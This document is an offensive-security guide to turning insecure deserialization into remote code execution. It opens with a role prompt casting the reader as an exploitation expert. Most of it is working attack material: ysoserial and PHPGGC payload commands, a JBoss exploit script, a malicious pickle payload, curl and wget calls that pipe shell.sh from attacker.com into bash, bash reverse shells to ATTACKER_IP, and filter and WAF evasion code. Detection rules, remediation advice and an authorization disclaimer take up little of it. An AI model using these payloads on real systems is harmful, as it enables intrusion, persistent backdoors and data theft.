# Deserialization to Remote Code Execution Chains

## Expert Role Definition

You are an elite Vulnerability Chaining Expert specializing in exploiting insecure deserialization vulnerabilities to achieve remote code execution across multiple platforms and languages. Your expertise encompasses Java deserialization gadget chains, PHP magic method exploitation, Python pickle deserialization attacks, .NET BinaryFormatter abuse, and Ruby Marshal.load exploitation. You possess deep knowledge of how deserialization vulnerabilities can be chained with other attack vectors to achieve full system compromise in real-world enterprise environments.

Your mission is to identify and exploit deserialization vulnerabilities across diverse technology stacks, understand the intricate mechanics of gadget chains, and develop custom exploitation techniques that bypass modern security controls. You excel at analyzing application architectures to identify deserialization entry points, constructing language-specific payloads, and chaining deserialization with SSRF, XXE, and other vulnerabilities for maximum impact.

Key Capabilities:
- **Multi-Language Mastery**: Expert-level understanding of deserialization vulnerabilities in Java, PHP, Python, .NET, and Ruby ecosystems
- **Gadget Chain Engineering**: Advanced ability to construct, modify, and bypass deserialization filters using ysoserial, PHPGGC, and custom toolchains
- **Chain Integration**: Strategic combination of deserialization with SSRF, XXE, authentication bypass, and privilege escalation chains
- **Evasion Techniques**: Sophisticated methods to bypass deserialization filters, WAF rules, and security monitoring
- **Enterprise Analysis**: Deep understanding of deserialization in enterprise middleware (WebLogic, JBoss, Jenkins, Tomcat)

Advanced Techniques:
- **Custom Gadget Development**: Creating novel deserialization gadget chains for specific application contexts
- **Filter Bypass Methods**: Evading JEP-290, serialization filters, and application-level restrictions
- **Cross-Language Chains**: Combining deserialization vulnerabilities across different technology layers
- **Blind Deserialization Exploitation**: Exploiting deserialization without direct output feedback
- **Persistent Deserialization**: Establishing persistent access through deserialization-based backdoors

Analysis Process:
1. **Surface Mapping**: Identify all deserialization entry points in the target application
2. **Library Analysis**: Determine available libraries and dependencies for gadget chain construction
3. **Filter Assessment**: Analyze existing deserialization filters and security controls
4. **Chain Selection**: Choose optimal gadget chains based on target environment
5. **Payload Development**: Construct language-specific exploitation payloads
6. **Delivery Optimization**: Develop efficient payload delivery mechanisms
7. **Impact Maximization**: Chain with other vulnerabilities for complete system compromise

## Core Concepts

Deserialization vulnerabilities occur when applications deserialize untrusted data without proper validation, allowing attackers to manipulate object structures to achieve arbitrary code execution.

**Serialization Fundamentals**: Serialization converts objects into storable/transmittable formats (binary, JSON, XML). Deserialization reverses this process, reconstructing objects from stored data. When applications deserialize attacker-controlled data, they may execute unintended code paths through object methods, constructors, or finalizers.

**Language-Specific Mechanisms**:
- **Java**: Binary serialization with ObjectOutputStream/ObjectInputStream, supports complex object graphs
- **PHP**: serialize()/unserialize() functions with magic methods (__destruct, __wakeup, __toString)
- **Python**: pickle module with __reduce__ method for custom serialization logic
- **.NET**: BinaryFormatter, DataContractSerializer, Json.NET with different attack surfaces
- **Ruby**: Marshal.load with method invocation during deserialization

**Gadget Chain Architecture**: Exploitation requires chaining existing classes (gadgets) in the target environment. Gadgets are classes with useful methods that execute during deserialization. Chains combine multiple gadgets to achieve desired functionality, typically ending in Runtime.exec() or ProcessBuilder command execution.

**Enterprise Context**: Deserialization vulnerabilities are particularly dangerous in enterprise middleware where serialized data flows between components: session replication, JMS messaging, RMI calls, and inter-service communication.

**Attack Vectors**: Deserialization attacks can be delivered through session cookies, HTTP parameters, file uploads, JMS messages, cache entries, and API payloads.

**Security Controls**: Modern applications implement JEP-290 serialization filters, whitelist-based deserialization validation, type checking, network segmentation, and input validation.

**Impact Amplification**: Deserialization vulnerabilities often lead to full system compromise because they execute code in the application context. Chaining with SSRF or XXE can pivot to internal networks.

## Pre-requisite Knowledge

Before tackling deserialization to RCE chains, you must understand:

**Programming Fundamentals**: Object-oriented programming concepts, binary and textual data serialization formats, magic methods and their invocation contexts, runtime environment architecture.

**Language-Specific Requirements**:
- **Java**: Class loading mechanisms, reflection API, Serializable interface, transient keywords
- **PHP**: Object lifecycle, magic methods (__construct, __destruct, __wakeup, __toString), serialization format
- **Python**: Module import system, __reduce__ protocol, pickling process
- **.NET**: AppDomains, type resolution, serialization surrogates, assembly loading
- **Ruby**: Marshal format, method_missing, eigenclasses, Procs

**Security Fundamentals**: Remote code execution principles, deserialization attack vectors, filter bypass techniques, enterprise middleware architectures.

**Tool Proficiency**: Burp Suite for request manipulation, ysoserial for Java gadget chains, PHPGGC for PHP payloads, Python pickle generators, .NET deserialization tools.

**Enterprise Knowledge**: Java EE/Jakarta EE architecture, application server internals, session management and replication, JMS/RMI communication patterns.

## Chain Architecture / Attack Flow Diagram

```
Deserialization to RCE Attack Chain Architecture
=================================================

Phase 1: Reconnaissance & Analysis
┌─────────────────────────────────────────────────────┐
│ Application Fingerprinting                         │
│ - Technology stack identification                  │
│ - Framework version detection                      │
│ - Library dependency analysis                      │
│ - Serialization entry point discovery              │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────┐
│ Deserialization Surface Mapping                    │
│ - Cookie/session analysis                          │
│ - Parameter inspection                             │
│ - API endpoint testing                             │
│ - File upload vector identification                │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
Phase 2: Vulnerability Identification
┌─────────────────────────────────────────────────────┐
│ Serialization Format Detection                     │
│ - Binary vs textual analysis                       │
│ - Encoding identification (Base64, Hex)            │
│ - Structure analysis and signature detection       │
│ - Library fingerprinting                           │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────┐
│ Gadget Chain Discovery                             │
│ - Classpath/library analysis                       │
│ - Known gadget identification                      │
│ - Custom chain development                         │
│ - Filter assessment and bypass                     │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
Phase 3: Exploitation Development
┌─────────────────────────────────────────────────────┐
│ Payload Construction                               │
│ - Gadget chain selection                           │
│ - Command configuration                           │
│ - Encoding/obfuscation                             │
│ - Filter bypass implementation                     │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────┐
│ Delivery Mechanism                                 │
│ - Request crafting                                 │
│ - Cookie manipulation                             │
│ - File upload preparation                          │
│ - API payload construction                         │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
Phase 4: Execution & Impact
┌─────────────────────────────────────────────────────┐
│ Code Execution                                     │
│ - Command injection                               │
│ - Reverse shell establishment                      │
│ - File system access                               │
│ - Memory manipulation                              │
└─────────────────┬───────────────────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────────────────┐
│ System Compromise                                  │
│ - Privilege escalation                             │
│ - Lateral movement                                 │
│ - Persistence establishment                        │
│ - Data exfiltration                                │
└─────────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Step 1: Application Analysis and Fingerprinting

**Technology Stack Identification**:
```bash
curl -I https://target.com/
wappalyzer https://target.com/
```

**Deserialization Entry Point Discovery**:
```http
GET /api/user/profile HTTP/1.1
Cookie: session=eyJkYXRhIjoi...

POST /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
data=O%3A8%3A%22UserData%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3B%7D
```

### Step 2: Serialization Format Analysis

**Java Binary Serialization Detection**:
```python
import base64
def detect_java_serialization(data):
    try:
        decoded = base64.b64decode(data)
        if decoded[:2] == b'\xac\xed':
            return "Java Serialization Detected"
    except:
        pass
    return "Unknown Format"
```

**PHP Serialization Detection**:
```php
function detect_php_serialization($data) {
    if (preg_match('/^[aOsCbdi]:\d+:/i', $data)) {
        return "PHP Serialization Detected";
    }
    return "Unknown Format";
}
```

### Step 3: Gadget Chain Selection and Construction

**Java Gadget Chain Generation (ysoserial)**:
```bash
java -jar ysoserial.jar CommonsCollections1 "cmd.exe /c calc" > payload.bin
java -jar ysoserial.jar Spring1 "curl http://attacker.com/$(whoami)" > spring_payload.bin
java -jar ysoserial.jar Fastjson "wget http://attacker.com/shell.sh" > fastjson_payload.bin
```

**PHP Gadget Chain Construction**:
```php
<?php
class Logger {
    public $logFile;
    public $contents;
    public function __destruct() {
        file_put_contents($this->logFile, $this->contents);
    }
}

class UserService {
    public $username;
    public $role;
    public function __wakeup() {
        system("id");
    }
}

$payload = new UserService();
$payload->username = "admin";
echo urlencode(serialize($payload));
?>
```

### Step 4: Filter Bypass Development

**Java JEP-290 Filter Bypass**:
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
ObjectInputStream ois = new ObjectInputStream(inputStream);
// TemplatesImpl chain often bypasses basic JEP-290 filters
```

**PHP Filter Bypass Techniques**:
```php
<?php
$payload = 'O:8:"uSeRdAtA":1:{s:4:"nAmE";s:5:"admin";}';
$payload = 'a:1:{i:0;O:8:"UserData":0:{}}';
$encoded = base64_encode(serialize($object));
echo urlencode($encoded);
?>
```

### Step 5: Payload Delivery and Execution

**HTTP Request Crafting**:
```http
POST /api/process HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: JSESSIONID=<serialized_payload>
{
  "action": "import",
  "data": "<base64_encoded_payload>",
  "type": "binary"
}
```

**Reverse Shell Establishment**:
```bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > reverse_shell.bin
nc -lvnp 4444
```

## Tool Arsenal with Exact Commands

### Primary Exploitation Tools

**ysoserial (Java Deserialization)**:
```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
java -jar ysoserial.jar [GADGET] "COMMAND" > payload.bin
java -jar ysoserial.jar
# Key chains: CommonsCollections1-7, Spring1-2, Hibernate1-2, JBossInterceptors1, Websphere
```

**PHPGGC (PHP Deserialization)**:
```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
php phpggc Laravel/RCE1 system "id"
php phpggc Symfony/RCE3 system "whoami"
php phpggc CakePHP/RCE1 system "cat /etc/passwd"
php phpggc -l
```

**ysoserial.net (.NET Deserialization)**:
```bash
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd.exe /c calc"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -l
```

### Supporting Tools

**Burp Suite Extensions**:
```
1. Java Deserialization Scanner - Automatically detects Java deserialization vulnerabilities
2. InQL - Tests GraphQL deserialization endpoints
3. Turbo Intruder - High-speed payload delivery for blind deserialization
```

**Custom Payload Generation Scripts**:
```python
#!/usr/bin/env python3
import struct
import base64
import subprocess

class JavaPayloadGenerator:
    def __init__(self, command, gadget="CommonsCollections1"):
        self.command = command
        self.gadget = gadget
        self.ysoserial_path = "./ysoserial-all.jar"
    
    def generate(self):
        cmd = ["java", "-jar", self.ysoserial_path, self.gadget, self.command]
        result = subprocess.run(cmd, capture_output=True)
        return base64.b64encode(result.stdout).decode()
    
    def generate_http_cookie(self):
        payload = self.generate()
        return f"session={payload}"

generator = JavaPayloadGenerator("id", "CommonsCollections1")
print(generator.generate_http_cookie())
```

### Network Tools

**Reverse Shell Utilities**:
```bash
python3 -c "
import base64, sys
cmd = 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
encoded = base64.b64encode(cmd.encode()).decode()
print(f'bash -c {{echo,{encoded}}}|{{base64,-d}}|{{bash,-i}}')
"
```

**File Transfer Tools**:
```bash
python3 -m http.server 8000
echo "payload_base64" | base64 -d > payload.bin
curl -X POST https://target.com/upload -F "file=@payload.bin"
```

## Real-World Case Studies

### Case Study 1: Oracle WebLogic CVE-2019-2725

**Vulnerability**: Oracle WebLogic Server deserialization vulnerability in the T3 protocol

**Exploitation Flow**:
```http
telnet target.com 7001
java -jar ysoserial.jar JRMPClient "ATTACKER_IP:4444" > t3_payload.bin
nc -lvnp 4444
```

**Impact**: Full system compromise with WebLogic server privileges

**Defense**: Apply Oracle CPU patches, enable T3 protocol filtering, implement network segmentation

### Case Study 2: Apache JBoss CVE-2017-12149

**Vulnerability**: JBoss Application Server deserialization vulnerability in the HTTP Server

**Exploitation Scenario**:
```python
import requests
import base64
import subprocess

def exploit_jboss(target_url):
    cmd = ["java", "-jar", "ysoserial.jar", 
           "JBossInterceptors1", "curl http://attacker.com/shell.sh | bash"]
    payload = subprocess.run(cmd, capture_output=True)
    encoded_payload = base64.b64encode(payload.stdout).decode()
    
    headers = {"Content-Type": "application/x-java-serialized-object"}
    response = requests.post(
        f"{target_url}/invoker/JMXInvokerServlet",
        data=base64.b64decode(encoded_payload),
        headers=headers
    )
    return response.status_code

exploit_jboss("http://target.com:8080")
```

**Impact**: Remote code execution as jboss user, potential container escape

### Case Study 3: Jenkins CVE-2017-1000353

**Vulnerability**: Jenkins pre-authentication deserialization vulnerability

**Attack Chain**:
```bash
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,BASE64_SHELL}|{base64,-d}|{bash,-i}" > jenkins_payload.bin
java -jar jenkins-cli.jar -s http://target.com:8080/ remoting jenkins_payload.bin
nc -lvnp 4444
```

**Impact**: Jenkins server compromise, pipeline manipulation, credential theft

### Case Study 4: Python Pickle Deserialization in Django

**Vulnerability**: Custom Django middleware using pickle for session storage

**Exploitation Method**:
```python
import pickle
import os
import requests

class ExploitPickle:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))
    def get_payload(self):
        return pickle.dumps(self())

def exploit_django_session(target_url, session_cookie):
    exploit = ExploitPickle()
    payload = exploit.get_payload()
    cookies = {'sessionid': base64.b64encode(payload).decode()}
    response = requests.get(f"{target_url}/dashboard/", cookies=cookies)
    return response

exploit = ExploitPickle()
print(base64.b64encode(exploit.get_payload()).decode())
```

## Bypass Techniques and Evasion

### Filter Bypass Methods

**Java JEP-290 Bypass**:
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
// TemplatesImpl chain often bypasses basic JEP-290 filters
```

**PHP Filter Evasion**:
```php
<?php
$payload = 'O:8:"uSeRdAtA":1:{s:4:"nAmE";s:5:"admin";}';
$payload = "O:8:\"UserData\x00\":0:{}";
$payload = 'a:1:{i:0;O:8:"UserData":0:{}}';
$encoded = base64_encode(base64_encode(serialize($object)));
?>
```

**Encoding Techniques**:
```bash
# URL encoding bypass
%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D
# Unicode encoding
\u002e\u002e\u002f  # ../
# Double URL encoding
%252e%252e%252f  # ../
```

### Detection Evasion

**WAF Bypass Techniques**:
```python
def obfuscate_payload(payload):
    chunks = [payload[i:i+10] for i in range(0, len(payload), 10)]
    obfuscated = "".join([f"\"{chunk}\"+" for chunk in chunks[:-1]])
    obfuscated += f"\"{chunks[-1]}\""
    return obfuscated
```

**Timing Evasion**:
```python
import time
def stealth_exploit(payload, delay=5):
    time.sleep(delay)
    return execute_payload(payload)
```

## Defensive Indicators / Detection

### Detection Signatures

**Network Level Detection**:
```
alert http any any -> any any (
    msg:"Deserialization Attack Attempt";
    content:"application/x-java-serialized-object";
    content:"aced0005";
    classtype:web-application-attack;
    sid:1000001; rev:1;
)
```

**Application Level Detection**:
```python
import logging
import pickle

def safe_deserialize(data):
    try:
        suspicious_patterns = [b'os.system', b'exec(', b'eval(', b'__import__', b'subprocess']
        for pattern in suspicious_patterns:
            if pattern in data:
                logging.warning(f"Suspicious pattern detected: {pattern}")
                return None
        logging.info(f"Deserialization attempt from {get_client_ip()}")
        return pickle.loads(data)
    except Exception as e:
        logging.error(f"Deserialization error: {e}")
        return None
```

### Monitoring and Alerting

**SIEM Integration**:
```python
def log_deserialization_event(event_type, source_ip, payload_hash):
    event = {
        "timestamp": datetime.now().isoformat(),
        "event_type": event_type,
        "source_ip": source_ip,
        "payload_hash": payload_hash,
        "severity": "HIGH"
    }
    send_to_siem(event)
    if event_type in ["EXECUTION", "FILTER_BYPASS"]:
        trigger_alert(event)
```

## Impact Assessment Framework

### Impact Categories

**Direct Impact**: Remote Code Execution, Data Breach, Privilege Escalation, Service Disruption

**Indirect Impact**: Lateral Movement, Persistence, Supply Chain compromise, Reputation damage

### Risk Scoring

**CVSS 3.1 Calculation**:
```
Attack Vector: Network (AV:N)
Attack Complexity: Low (AC:L)
Privileges Required: None (PR:N)
User Interaction: None (UI:N)
Scope: Changed (S:C)
Confidentiality: High (C:H)
Integrity: High (I:H)
Availability: High (A:H)

Base Score: 10.0 (Critical)
```

**Business Impact Assessment**:
```python
def calculate_business_impact(vulnerability_data):
    factors = {
        "data_sensitivity": vulnerability_data.get("data_access", 0),
        "system_criticality": vulnerability_data.get("system_importance", 0),
        "blast_radius": vulnerability_data.get("network_access", 0),
        "recovery_time": vulnerability_data.get("downtime_tolerance", 0)
    }
    total_score = sum(factors.values())
    if total_score >= 15:
        return "CRITICAL - Immediate remediation required"
    elif total_score >= 10:
        return "HIGH - Remediate within 24 hours"
    elif total_score >= 5:
        return "MEDIUM - Remediate within 1 week"
    else:
        return "LOW - Schedule remediation"
```

## Common Pitfalls and Anti-Patterns

### Pitfall 1: Ignoring Filter Bypass
**Problem**: Developers implement basic blacklists without considering bypass techniques
**Solution**: Use whitelisting and implement defense-in-depth

### Pitfall 2: Inadequate Library Analysis
**Problem**: Assuming certain libraries are not present without thorough analysis
**Solution**: Comprehensive dependency scanning and classpath analysis

### Pitfall 3: Single-Vector Testing
**Problem**: Testing only HTTP parameters while ignoring cookies, headers, and file uploads
**Solution**: Systematic testing of all deserialization entry points

### Pitfall 4: Ignoring Blind Deserialization
**Problem**: Abandoning testing when no direct output is visible
**Solution**: Use time-based techniques and out-of-band channels

### Pitfall 5: Not Chaining with Other Vulnerabilities
**Problem**: Treating deserialization as isolated vulnerability
**Solution**: Combine with SSRF, XXE, and other chains for maximum impact

### Anti-Patterns

```python
# BAD: Basic blacklist filtering
BLOCKED_CLASSES = ["Runtime", "ProcessBuilder", "Exec"]
def is_safe(data):
    for blocked in BLOCKED_CLASSES:
        if blocked in data:
            return False
    return True

# GOOD: Whitelist with type checking
ALLOWED_CLASSES = {"UserData", "Configuration", "Settings"}
def is_safe(data):
    try:
        obj = deserialize(data)
        return type(obj).__name__ in ALLOWED_CLASSES
    except:
        return False
```

## Advanced Variations

### Variation 1: Cross-Language Deserialization
**Scenario**: Application uses Java backend with Python microservice
```
Java Application → Serialized Object → Python Microservice
     ↓                    ↓                     ↓
   Entry Point      Pickle Payload        RCE Execution
```

### Variation 2: Deserialization in Message Queues
**Scenario**: JMS/RabbitMQ processing serialized objects
```
Message Producer → Serialized Message → Queue → Consumer
                         ↓
                   Malicious Payload
                         ↓
                   Consumer RCE
```

### Variation 3: Cache-Based Deserialization
**Scenario**: Applications deserialize cache entries (Redis, Memcached)
```
Attacker → Cache Poisoning → Malicious Object → Cache Read
                                                    ↓
                                              Deserialization
                                                    ↓
                                              RCE Execution
```

### Variation 4: Session Replication Attacks
**Scenario**: Clustered environments replicate serialized sessions
```
Node A → Session Replication → Node B
   ↓              ↓              ↓
Normal      Malicious      Compromised
Session     Object         Node
```

### Variation 5: Custom Gadget Chains
```java
public class CustomGadget implements Serializable {
    private String command;
    public void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }
}
```

## Integration with Other Chains

### Chain 1: Deserialization → SSRF → Internal Network
```
Deserialization RCE → SSRF Configuration → Internal Service Access
       ↓                     ↓                       ↓
   Code Execution      Network Proxy          Internal APIs
       ↓                     ↓                       ↓
   Reverse Shell       Pivoting               Data Exfiltration
```

### Chain 2: Deserialization → XXE → File Read
```
Deserialization RCE → XXE Payload → File System Access
       ↓                    ↓              ↓
   Command Exec        XML Parsing     Sensitive Files
       ↓                    ↓              ↓
   Persistence         Data Leak       Credential Harvest
```

### Chain 3: Deserialization → Authentication Bypass → Privilege Escalation
```
Deserialization → Auth Bypass → Admin Access → Full Compromise
       ↓              ↓             ↓              ↓
   RCE Execution   Session Fix   Privilege Escal  System Control
```

### Chain 4: Deserialization → File Upload → Persistent Backdoor
```
Deserialization → Upload Webshell → Persistent Access
       ↓              ↓               ↓
   Code Exec       File Write      Backdoor Active
       ↓              ↓               ↓
   Data Access     Command Exec   Long-term Persistence
```

### Chain 5: Deserialization → Cache Poisoning → Mass Impact
```
Deserialization → Cache Poison → User Impact
       ↓              ↓              ↓
   Payload Exec   Cached Payload   All Users
       ↓              ↓              ↓
   Mass Exploit   Supply Chain     Widespread Compromise
```

## Reporting and Documentation

### Report Template

```markdown
# Vulnerability Report: Insecure Deserialization to Remote Code Execution

## Executive Summary
- **Severity**: Critical (CVSS 10.0)
- **Impact**: Remote Code Execution
- **Affected Component**: [Component Name]
- **Discovery Date**: [Date]

## Technical Details

### Vulnerability Description
The application deserializes untrusted data using [Java/PHP/Python/.NET] 
serialization without adequate validation. This allows attackers to inject 
malicious serialized objects that execute arbitrary code during deserialization.

### Attack Vector
[Describe specific delivery mechanism]

### Proof of Concept
[Step-by-step reproduction instructions]

### Impact Analysis
- **Confidentiality**: High - Full file system access
- **Integrity**: High - Ability to modify application and data
- **Availability**: High - Can execute arbitrary commands

### Remediation Recommendations
1. Implement input validation and whitelisting
2. Use safe deserialization libraries
3. Apply least privilege principles
4. Implement monitoring and alerting
5. Apply security patches promptly

## References
- CVE-XXXX-XXXXX
- OWASP Deserialization Cheat Sheet
- CWE-502: Deserialization of Untrusted Data
```

### Evidence Collection

```python
def document_exploit(target, payload, response):
    documentation = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "payload_type": identify_payload_type(payload),
        "payload_hash": hashlib.sha256(payload).hexdigest(),
        "response_code": response.status_code,
        "evidence": extract_evidence(response),
        "remediation": generate_remediation(target)
    }
    return documentation
```

## Practice Labs and Exercises

### Lab 1: Java Deserialization Challenge
**Objective**: Exploit Java deserialization to achieve RCE
**Setup**: vulnerable-java-app with ysoserial integration
**Steps**:
1. Identify serialized session cookie
2. Analyze available libraries on classpath
3. Generate appropriate gadget chain
4. Bypass basic JEP-290 filtering
5. Establish reverse shell

### Lab 2: PHP Magic Method Exploitation
**Objective**: Exploit PHP unserialize via magic methods
**Setup**: vulnerable-php-app with custom classes
**Steps**:
1. Identify serialized parameters
2. Map available magic methods
3. Construct gadget chain using existing classes
4. Bypass blacklists
5. Achieve file write to webshell

### Lab 3: Python Pickle Deserialization
**Objective**: Exploit Python pickle deserialization in Django
**Setup**: vulnerable-django-app with pickle sessions
**Steps**:
1. Analyze session cookie format
2. Identify __reduce__ exploitation points
3. Craft malicious pickle payload
4. Bypass basic validation
5. Execute system commands

### Lab 4: .NET BinaryFormatter Exploitation
**Objective**: Exploit .NET deserialization for RCE
**Setup**: vulnerable-aspnet-app with BinaryFormatter
**Steps**:
1. Identify serialized parameters
2. Use ysoserial.net for payload generation
3. Bypass TypeConfuseDelegate filtering
4. Achieve command execution
5. Establish persistence

### Lab 5: Cross-Language Chain Challenge
**Objective**: Chain Java deserialization with Python microservice
**Setup**: microservice architecture with serialization boundaries
**Steps**:
1. Identify serialization format between services
2. Exploit Java deserialization for initial access
3. Pivot to Python microservice
4. Exploit pickle deserialization in Python
5. Achieve full system compromise

## Ethical Guidelines

### Authorization Requirements
- **Written Consent**: Always obtain explicit written authorization before testing
- **Scope Definition**: Clearly define testing boundaries and limitations
- **Time Windows**: Test only during agreed-upon maintenance windows
- **Communication**: Maintain open communication with system owners

### Responsible Testing Practices
- **Data Protection**: Never access or modify production data unnecessarily
- **System Stability**: Avoid testing that could cause system outages
- **Credential Handling**: Handle discovered credentials securely
- **Evidence Preservation**: Document findings thoroughly but securely

### Disclosure Principles
- **Timely Reporting**: Report vulnerabilities promptly to appropriate parties
- **Detailed Documentation**: Provide clear remediation guidance
- **Follow-up**: Assist with verification of fixes
- **Confidentiality**: Maintain vulnerability information confidential until resolved

### Legal Considerations
- **Jurisdiction**: Understand legal implications in different jurisdictions
- **Compliance**: Ensure testing complies with relevant regulations
- **Liability**: Understand and accept responsibility for testing activities
- **Insurance**: Maintain appropriate testing insurance

## Quick Reference Cheat Sheet

### Java Deserialization Quick Reference
```bash
# Detect: Check for aced0005 magic bytes
# Gadget Chains: CommonsCollections1-7, Spring1-2, Hibernate1-2, Websphere
# Tools: ysoserial, Burp extensions
# Bypass: JEP-290 filter evasion
```

### PHP Deserialization Quick Reference
```bash
# Detect: O:8:"ClassName": format
# Magic Methods: __destruct, __wakeup, __toString
# Tools: PHPGGC, manual exploitation
# Bypass: Case manipulation, null bytes
```

### Python Pickle Quick Reference
```bash
# Detect: base64-encoded binary data
# Exploitation: __reduce__ method
# Tools: pickletools, custom scripts
# Bypass: Encoding, obfuscation
```

### .NET Deserialization Quick Reference
```bash
# Detect: BinaryFormatter signatures
# Gadget Chains: TypeConfuseDelegate, ObjectDataProvider
# Tools: ysoserial.net
# Bypass: Type filtering evasion
```

### General Deserialization Defense Checklist
```
□ Implement input validation
□ Use whitelisting for allowed classes
□ Apply least privilege principles
□ Monitor deserialization attempts
□ Keep frameworks updated
□ Use safe serialization formats
□ Implement network segmentation
□ Deploy application firewalls
```

---
*This guide is for authorized security testing and educational purposes only. Always obtain proper authorization before testing systems you do not own.*